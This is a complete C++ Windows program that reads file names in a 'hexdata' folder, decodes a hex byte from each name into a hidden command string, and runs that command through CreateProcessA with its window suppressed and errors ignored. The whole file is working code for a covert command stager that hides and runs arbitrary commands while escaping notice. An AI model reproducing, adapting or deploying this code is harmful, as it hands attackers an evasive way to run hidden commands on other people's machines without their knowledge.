#include <windows.h>
#include <string.h>
#include <stdio.h>

constexpr int MAX_FILENAME_LENGTH = 256;
constexpr int MAX_MESSAGE_LENGTH = 1024;

static char hex_to_char(const char* hex) {
    unsigned int temp;
    // Try to parse the hexadecimal string
    if (sscanf_s(hex, "%2x", &temp) != 1) {
        return '\0';  // Return null character on error
    }
    return static_cast<char>(temp);
}

int main() {
    const char* folder_name = "hexdata\\*";  // Include wildcard for FindFirstFile
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(folder_name, &findFileData);
    char message[MAX_MESSAGE_LENGTH] = "";

    if (hFind == INVALID_HANDLE_VALUE) {
        return EXIT_FAILURE;
    }

    do {
        // Skip '.' and '..'
        if (findFileData.cFileName[0] == '.') {
            continue;
        }

        // Split the filename into ID and hex part
        char* underscore = strchr(findFileData.cFileName, '_');
        if (underscore != NULL) {
            *underscore = '\0';  // Split at underscore
            char* hex_part = underscore + 1;
            hex_part[strcspn(hex_part, ".")] = '\0';  // Remove .txt extension

            // Convert hex to a character and append to the message
            char character = hex_to_char(hex_part);
            if (character != '\0') {
                strncat_s(message, sizeof(message), &character, 1); // Append one character to message
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);

    // Execute the command without creating a visible window
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, message, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // If CreateProcess fails, you can handle errors silently or log them elsewhere
        return EXIT_FAILURE;
    }

    // Wait for the process to finish if necessary, then close handles
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
